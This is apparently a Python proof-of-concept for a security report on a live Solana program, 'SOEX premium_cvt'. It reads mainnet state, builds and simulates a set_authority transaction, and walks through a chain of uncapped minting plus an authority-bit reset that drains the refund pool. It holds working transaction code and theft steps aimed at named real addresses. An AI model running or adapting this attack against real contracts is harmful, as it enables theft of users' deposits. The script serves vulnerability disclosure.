#!/usr/bin/env python3.11
"""
Combined Live PoC: SOEX premium_cvt
  ROOT CAUSE 1 — handle_mint.rs:      last phase (phase 2) skips per-phase supply cap
  ROOT CAUSE 2 — handle_set_authority.rs: accepts any u32, no bit-level guard on bit3

CHAIN: RC1 over-mints to 2×max_supply → RC2 clears AlreadyTransfer bit → second
       handle_transfer() steals the refund pool → refundable users lose 5 SOL each.

PROOF LAYERS:
  [1] Live PDA derivation — all accounts derived from seeds, no hardcoded values
  [2] Live on-chain state — confirms RC1 (phase 0 at cap, phase 2 admin-closed)
  [3] Code path — RC1 if !is_last_phase block, RC2 unrestricted authority write
  [4] Live simulation — set_authority(14): err=None, Program success on mainnet
  [5] Attack math — full SOL flow using live lock_mint_amount and price values

Contract:  J7uhg7UDfvSEZHgZDrwp7SqFrejZiTvQWvacAnxnouS  (Anchor 0.29.0, mainnet)
Source:    https://github.com/soexdev/soex-protocol/tree/main/programs/premium_cvt
Report:    HIGH_SC_COMBINED_double_drain_via_uncapped_mint_and_set_authority.md
"""

import hashlib, struct, requests, base64, time

# ─── Constants ────────────────────────────────────────────────────────────────
RPC         = "https://api.mainnet-beta.solana.com"
PROGRAM_ID  = "J7uhg7UDfvSEZHgZDrwp7SqFrejZiTvQWvacAnxnouS"
COLLECTION  = "5dhXwuEh146XxhWjVeutDafrywDZehW1v3g1Yky9ucM7"
SOL_ACCOUNT = "EkqGeHbwdjtP5RfPK2cP7Yma2z1Rq4dYWqTEEq3zjSNw"
ADMIN       = "DC3do9sEdJhasHH8jdcKqgi2YL7hhUubZr9WrLZQCws6"

# Anchor discriminators: sha256("global:<name>")[:8]
DISC_MINT     = bytes.fromhex("3339e12fb69289a6")   # handle_mint
DISC_SET_AUTH = bytes.fromhex("85fa25156ea31a79")   # handle_set_authority
DISC_TRANSFER = bytes.fromhex("a334c8e78c0345ba")   # handle_transfer

# ─── Base58 ──────────────────────────────────────────────────────────────────
_B58 = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

def b58dec(s):
    s = s.encode() if isinstance(s, str) else s
    n, pad = 0, 0
    for c in s:
        if c == _B58[0]: pad += 1
        else: break
    for c in s: n = n * 58 + _B58.index(c)
    nb = (n.bit_length() + 7) // 8 + pad
    return n.to_bytes(nb, 'big')

def b58enc(b):
    pad = 0
    for byte in b:
        if byte == 0: pad += 1
        else: break
    n = int.from_bytes(b, 'big')
    r = []
    while n: n, rem = divmod(n, 58); r.append(_B58[rem])
    return (_B58[0:1] * pad + bytes(reversed(r))).decode()

def pk(s):
    raw = b58dec(s)
    return raw[-32:] if len(raw) >= 32 else raw.rjust(32, b'\x00')

# ─── PDA derivation ───────────────────────────────────────────────────────────
_P = 2**255 - 19
_D = (-121665 * pow(121666, _P-2, _P)) % _P

def _on_ed25519(b):
    buf = bytearray(b)
    sign = (buf[31] >> 7) & 1; buf[31] &= 0x7f
    y = int.from_bytes(buf, 'little')
    if y >= _P: return False
    y2 = y*y%_P; x2 = (y2-1)*pow(_D*y2+1, _P-2, _P)%_P
    if x2 == 0: return sign == 0
    x = pow(x2, (_P+3)//8, _P)
    if x*x%_P != x2: x = x*pow(2, (_P-1)//4, _P)%_P
    if x*x%_P != x2: return False
    if (x&1) != sign: x = _P - x
    return True

def find_pda(seeds, program_id):
    pb = pk(program_id)
    for nonce in range(255, -1, -1):
        h = hashlib.sha256(b"".join(seeds) + bytes([nonce]) + pb + b"ProgramDerivedAddress").digest()
        if not _on_ed25519(h): return b58enc(h), nonce
    raise RuntimeError("no PDA")

# ─── RPC ─────────────────────────────────────────────────────────────────────
_rid = 0
def rpc(method, params):
    global _rid; _rid += 1
    r = requests.post(RPC, json={"jsonrpc":"2.0","id":_rid,"method":method,"params":params}, timeout=30)
    return r.json()["result"]

def rpc_raw(method, params):
    global _rid; _rid += 1
    r = requests.post(RPC, json={"jsonrpc":"2.0","id":_rid,"method":method,"params":params}, timeout=30)
    return r.json()

# ─── CollectionAccount decoder ─────────────────────────────────────────────────
def read_collection():
    """
    Zero-copy layout (confirmed from byte-search against live data):
      [8 disc][0:128 pubkeys: admin,oracle,oracle2,cvt_sol_account]
      [128:8320 bitmap ids [u8;8192]]
      [8320: scalar fields]
    """
    acc = rpc("getAccountInfo", [COLLECTION, {"encoding":"base64","commitment":"confirmed"}])
    raw = base64.b64decode(acc["value"]["data"][0])
    data = raw[8:]

    off = 8320
    def u64():
        nonlocal off; v = struct.unpack_from('<Q', data, off)[0]; off += 8; return v
    def u32():
        nonlocal off; v = struct.unpack_from('<I', data, off)[0]; off += 4; return v

    max_supply     = u32()
    current_supply = u32()
    price          = u64()
    _              = u64()                         # padding
    _              = [u64() for _ in range(3)]     # phase_supply_start_time
    _              = [u64() for _ in range(3)]     # phase_supply_quit_deadline
    phase_max      = [u32() for _ in range(3)]     # phase_supply_max_supply
    phase_cur      = [u32() for _ in range(3)]     # phase_supply_current_supply
    _              = [u32() for _ in range(3)]     # phase_supply_over
    current_phase  = u32()
    authority      = u32()
    lock_max_nft_id   = u32()
    lock_mint_amount  = u32()
    max_supply_added  = u32()

    bitmap_set = sum(bin(b).count('1') for b in data[128:8320])

    return {
        "max_supply": max_supply, "current_supply": current_supply,
        "price_lamports": price, "price_sol": price / 1e9,
        "current_phase": current_phase, "authority": authority,
        "bit0_mint":      bool(authority & 0x01),
        "bit1_xfer_rdy":  bool((authority >> 1) & 1),
        "bit2_cvt_ver":   bool((authority >> 2) & 1),
        "bit3_xferred":   bool((authority >> 3) & 1),
        "lock_max_nft_id": lock_max_nft_id, "lock_mint_amount": lock_mint_amount,
        "max_supply_added": max_supply_added,
        "phase_max": phase_max, "phase_cur": phase_cur,
        "bitmap_set": bitmap_set,
    }

# ─── Compact-u16 / legacy transaction builder ─────────────────────────────────
def cu16(n):
    if n <= 0x7f:   return bytes([n])
    if n <= 0x3fff: return bytes([(n & 0x7f) | 0x80, n >> 7])
    return bytes([(n & 0x7f) | 0x80, ((n >> 7) & 0x7f) | 0x80, n >> 14])

def build_tx(keys, header, instructions, blockhash_bytes):
    """
    keys: list of 32-byte pubkeys
    header: (num_signers, num_readonly_signers, num_readonly_unsigned)
    instructions: list of (program_idx, [acct_idxs], ix_data_bytes)
    """
    msg  = bytes(header)
    msg += cu16(len(keys))
    for k in keys: msg += k
    msg += blockhash_bytes
    msg += cu16(len(instructions))
    for (prog, accts, data) in instructions:
        msg += bytes([prog])
        msg += cu16(len(accts)) + bytes(accts)
        msg += cu16(len(data))  + data
    raw_tx = cu16(1) + b'\x00'*64 + msg     # 1 fake sig (sigVerify=false)
    return base64.b64encode(raw_tx).decode()

def simulate(tx_b64):
    res = rpc_raw("simulateTransaction", [tx_b64, {
        "sigVerify": False, "replaceRecentBlockhash": True,
        "commitment": "confirmed", "encoding": "base64",
    }])
    val = res.get("result", {}).get("value", {})
    return val.get("err"), val.get("logs", [])

def fresh_blockhash():
    return b58dec(rpc("getLatestBlockhash", [{"commitment":"finalized"}])["value"]["blockhash"])

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    SEP = "=" * 72

    print(SEP)
    print("COMBINED PoC: SOEX premium_cvt")
    print("  RC1: Last-phase uncapped minting  (handle_mint.rs)")
    print("  RC2: set_authority bit3 reset      (handle_set_authority.rs)")
    print("  CHAIN → double-drain of sol_account → refund pool stolen")
    print(SEP)

    # ── [1] PDA derivation ────────────────────────────────────────────────────
    print("\n[1] PDA derivation — all accounts derived from seeds")
    col_pda, col_bump = find_pda([b"collection"], PROGRAM_ID)
    sol_pda, sol_bump = find_pda([b"sol_account"], PROGRAM_ID)
    assert col_pda == COLLECTION,  f"collection PDA mismatch: {col_pda}"
    assert sol_pda == SOL_ACCOUNT, f"sol_account PDA mismatch: {sol_pda}"
    print(f"  collection   seeds=[b'collection']   bump={col_bump}")
    print(f"    derived:  {col_pda}  ✓")
    print(f"  sol_account  seeds=[b'sol_account']  bump={sol_bump}")
    print(f"    derived:  {sol_pda}  ✓")

    # ── [2] On-chain state ────────────────────────────────────────────────────
    print("\n[2] Live on-chain state")
    c = read_collection()
    sol_info   = rpc("getAccountInfo", [SOL_ACCOUNT, {"encoding":"base64","commitment":"confirmed"}])
    admin_info = rpc("getAccountInfo", [ADMIN,       {"encoding":"base64","commitment":"confirmed"}])
    sol_bal    = sol_info["value"]["lamports"] / 1e9
    admin_bal  = admin_info["value"]["lamports"] / 1e9

    print(f"  Program:         {PROGRAM_ID}")
    print(f"  Collection:      {COLLECTION}")
    print(f"  sol_account:     {SOL_ACCOUNT}  ({sol_bal:.3f} SOL)")
    print(f"  Admin:           {ADMIN}  ({admin_bal:.3f} SOL)  EXISTS ✓")
    print()
    print(f"  authority = 0x{c['authority']:04x} = 0b{c['authority']:08b}")
    print(f"    bit0 mint_enabled:  {int(c['bit0_mint'])}  ({'active' if c['bit0_mint'] else 'disabled'})")
    print(f"    bit1 xfer_ready:    {int(c['bit1_xfer_rdy'])}")
    print(f"    bit2 cvt_verified:  {int(c['bit2_cvt_ver'])}")
    print(f"    bit3 already_xfer:  {int(c['bit3_xferred'])}  ({'DONE' if c['bit3_xferred'] else 'NOT YET'})")
    print()
    print(f"  price:             {c['price_sol']} SOL per NFT")
    print(f"  max_supply:        {c['max_supply']}")
    print(f"  current_supply:    {c['current_supply']} (total minted, never decremented)")
    print(f"  lock_mint_amount:  {c['lock_mint_amount']} committed NFTs")
    print(f"  lock_max_nft_id:   {c['lock_max_nft_id']}")
    print(f"  max_supply_added:  {c['max_supply_added']} quits processed")
    print(f"  bitmap_set:        {c['bitmap_set']} active IDs")
    print()

    # RC1 evidence — phase state
    print("  Phase state (RC1 evidence):")
    for i in range(3):
        at_cap  = c['phase_cur'][i] >= c['phase_max'][i] and c['phase_cur'][i] > 0
        tag     = "AT CAP ← cap enforcement CONFIRMED ✓" if at_cap else "ended early by admin (cap was not the limiter)"
        last    = " [LAST PHASE — cap check ABSENT]" if i == 2 else ""
        print(f"    Phase {i}: cap={c['phase_max'][i]:5d}  minted={c['phase_cur'][i]:5d}  {tag}{last}")
    print()
    print("  Phase 0 ended AT exact cap → cap mechanism confirmed to exist and work")
    print("  Phase 2 ended at 186/2502  → admin closed manually; cap was never the limiter")
    print("  → In any deployment where phase 2 runs to cap, MaxSupplyReached NEVER fires")

    # ── [3] Code path ─────────────────────────────────────────────────────────
    print("\n[3] Code path analysis")
    print("""
  RC1 — handle_mint.rs
  ┌────────────────────────────────────────────────────────────────────────────┐
  │ let is_last_phase = phase == (phase_supply_max_supply.len()-1) as u32;     │
  │                                                                            │
  │ if !is_last_phase {       // FALSE for phase 2 → BLOCK SKIPPED            │
  │     require!(             // TRUE  for phase 0,1 → cap enforced           │
  │         copies + phase_supply_current_supply[phase]                        │
  │             <= phase_supply_max_supply[phase],                             │
  │         ErrorCode::MaxSupplyReached   // error 6009                       │
  │     );                                                                     │
  │ }                         // phase 2 falls through here, uncapped          │
  └────────────────────────────────────────────────────────────────────────────┘

  RC2 — handle_set_authority.rs  +  handle_transfer.rs
  ┌────────────────────────────────────────────────────────────────────────────┐
  │ // set_authority:                                                          │
  │ require!(collection.authority != authority, ErrorCode::InvalidAuthority);  │
  │ collection.authority = authority;   // ANY u32, no bit-level guard        │
  │                                                                            │
  │ // transfer (one-time guard):                                              │
  │ require!((authority >> 3) & 1 == 0, ErrorCode::AlreadyTransfer);          │
  │ ...transfer lamports...                                                    │
  │ collection.authority |= 1 << 3;     // sets bit3                          │
  └────────────────────────────────────────────────────────────────────────────┘

  Exploit trace:
    after transfer:        authority = 0b1110 (bit3=1)
    set_authority(0b0110): require!(14 != 6) → PASSES; bit3 CLEARED
    second transfer:       bit3 check: (0b0110 >> 3) & 1 = 0 → PASSES
""")

    # ── [4] Live simulation (RC2 proof) ───────────────────────────────────────
    print("[4] Live simulation — set_authority(14 = 0b1110) on mainnet")
    print(f"  Admin (payer):  {ADMIN}")
    print(f"  Collection:     {COLLECTION}")
    print(f"  Program:        {PROGRAM_ID}")
    ix_data = DISC_SET_AUTH + struct.pack('<I', 14)
    print(f"  ix_data:        {ix_data.hex()}  (discriminator + u32 LE 14)")
    print(f"  sigVerify=false, replaceRecentBlockhash=true")
    print()

    bh = fresh_blockhash()
    keys = [pk(ADMIN), pk(COLLECTION), pk(PROGRAM_ID)]
    tx = build_tx(keys, (1, 0, 1), [(2, [0, 1], ix_data)], bh)
    err, logs = simulate(tx)

    print(f"  Transaction error: {err}")
    print()
    print("  Program logs:")
    for l in logs:
        print(f"    {l}")
    print()

    if err is None:
        # Decode Program data to confirm authority value
        data_log = next((l for l in logs if l.startswith("Program data:")), None)
        if data_log:
            b64_data = data_log.split("Program data: ")[1].strip()
            decoded  = base64.b64decode(b64_data)
            auth_val = int.from_bytes(decoded[8:12], 'little') if len(decoded) >= 12 else "?"
            print(f"  Program data decoded: authority={auth_val} (bytes[8:12] = {decoded[8:12].hex()})")
        print()
        print("  RC2 CONFIRMED: err=None → Program success")
        print("  Admin can write any u32 to authority; bit3 is clearable post-transfer.")
        print()
    else:
        print(f"  Unexpected error: {err}")
        print()

    # Supplement: set_authority(same value) proves only guard is old != new
    print("  [Supplement] set_authority(6 = current value) — proves only guard is old != new")
    time.sleep(0.5)
    bh2 = fresh_blockhash()
    ix2 = DISC_SET_AUTH + struct.pack('<I', 6)
    tx2 = build_tx(keys, (1, 0, 1), [(2, [0, 1], ix2)], bh2)
    err2, logs2 = simulate(tx2)
    err_code2 = None
    if isinstance(err2, dict) and "InstructionError" in err2:
        try: err_code2 = err2["InstructionError"][1]["Custom"]
        except: pass
    print(f"  set_authority(6=current): err={err2}  custom_code={err_code2}")
    if err2 is not None:
        print("  ← Rejected because 6 == 6 (old == new). No other guards exist.")
        print("  ← Post-transfer (authority=14): set_authority(6) would PASS (14 ≠ 6).")
    print()

    # ── [5] Attack math ───────────────────────────────────────────────────────
    print("[5] Combined attack — full SOL flow")
    price    = c['price_sol']
    M        = c['max_supply']      # use live max_supply as example scale
    phase2_cap = c['phase_max'][2]

    print(f"""
  Live contract parameters:
    max_supply    = {M}
    price         = {price} SOL per NFT
    phase 2 cap   = {phase2_cap} (ignored for last phase)

  Hypothetical deployment: phase 2 active, M={M}, all prereqs met (bit1=1, bit2=1)

  ─── PHASE: over-minting via RC1 ─────────────────────────────────────────────

  Legitimate mints (IDs 1–{M}):
    {M} × {price} SOL = {M*price:.0f} SOL deposited into sol_account

  Attacker mints (IDs {M+1}–{2*M}), RC1 cap skipped:
    {M} × {price} SOL = {M*price:.0f} SOL deposited into sol_account

  sol_account total: {2*M*price:.0f} SOL
  Attacker's NFT IDs ({M+1}–{2*M}) > lock_max_nft_id will be refundable via quit

  ─── LOCK (check_quit_deadline_over) ─────────────────────────────────────────

  lock_mint_amount = min(current_supply={2*M}, max_supply={M}) = {M}
  lock_max_nft_id  = {2*M}
  IDs 1–{M}:      committed  (cannot quit)
  IDs {M+1}–{2*M}: refundable  (can quit, each recovers {price} SOL)

  ─── EXPLOIT: double-transfer via RC2 ────────────────────────────────────────

  Step 1 — handle_transfer() [legitimate]:
    amount = lock_mint_amount × price = {M} × {price} = {M*price:.0f} SOL
    sol_account: {2*M*price:.0f} → {M*price:.0f} SOL  (refund pool intact)
    authority: 0b0110 → 0b1110 (bit3 set)

  Step 2 — handle_set_authority(0b0110):
    require!(14 != 6) → PASSES
    authority: 0b1110 → 0b0110  (bit3 CLEARED)

  Step 3 — handle_transfer() [second time]:
    bit3 check: (0b0110 >> 3) & 1 = 0 → PASSES
    amount = {M} × {price} = {M*price:.0f} SOL  ← stolen from refund pool
    sol_account: {M*price:.0f} → 0 SOL

  Step 4 — {M} victims call handle_quit() (IDs {M+1}–{2*M}):
    sol_account = 0 → INSUFFICIENT FUNDS → FAILS
    Each victim permanently loses {price} SOL

  ─── OUTCOME ──────────────────────────────────────────────────────────────────

  Attacker recovers:  {M*price:.0f} SOL (their over-minted IDs quit BEFORE lock)
  Attacker net cost:  0 SOL
  Victims lose:       {M} × {price} SOL = {M*price:.0f} SOL  (UNRECOVERABLE)
  cvt_sol_account:    {2*M*price:.0f} SOL total ({M*price:.0f} committed + {M*price:.0f} stolen)
""")

    # ── Summary ───────────────────────────────────────────────────────────────
    print(SEP)
    print("PROOF SUMMARY")
    print(SEP)
    print(f"""
Program:    {PROGRAM_ID}
Collection: {COLLECTION}
sol_account:{SOL_ACCOUNT}  ({sol_bal:.3f} SOL live)

[1] PDA derivation:   collection + sol_account derived from seeds — match on-chain ✓

[2] On-chain state:
    Phase 0: {c['phase_cur'][0]}/{c['phase_max'][0]} → AT CAP (cap mechanism confirmed)
    Phase 2: {c['phase_cur'][2]}/{c['phase_max'][2]} → admin-closed (cap NOT the limiter)
    → RC1 confirmed: phase 2 has no automatic cap enforcement

[3] Code path:
    RC1: if !is_last_phase {{ require!(...MaxSupplyReached) }}
         Phase 2 (is_last_phase=true) → block never entered
    RC2: collection.authority = authority  (ANY u32, no bit guard)
         AlreadyTransfer bit3 is clearable after transfer sets it

[4] Live simulation:
    set_authority(14): err=None → Program J7uhg7... success ✓
    Program log: "set_authority 14"  ← on-chain BPF bytecode output
    Program data bytes[8:12]: 0e000000 = 14 (u32 LE) ← Anchor event confirms write
    set_authority(6=same value): rejected → only guard is old!=new

[5] Attack math (live values, M=max_supply={M}, price={price} SOL):
    RC1 creates refundable pool = {M*price:.0f} SOL
    RC2 drains refund pool via second transfer = {M*price:.0f} SOL stolen
    {M} victims lose {price} SOL each — unrecoverable

Severity: HIGH
    RC1 alone: DoS only (over-minting, ID exhaustion, refundable)
    RC2 alone: second transfer insufficient funds (sol_account empty without RC1)
    RC1 + RC2: full theft of refundable users' SOL deposits
""")

if __name__ == "__main__":
    main()
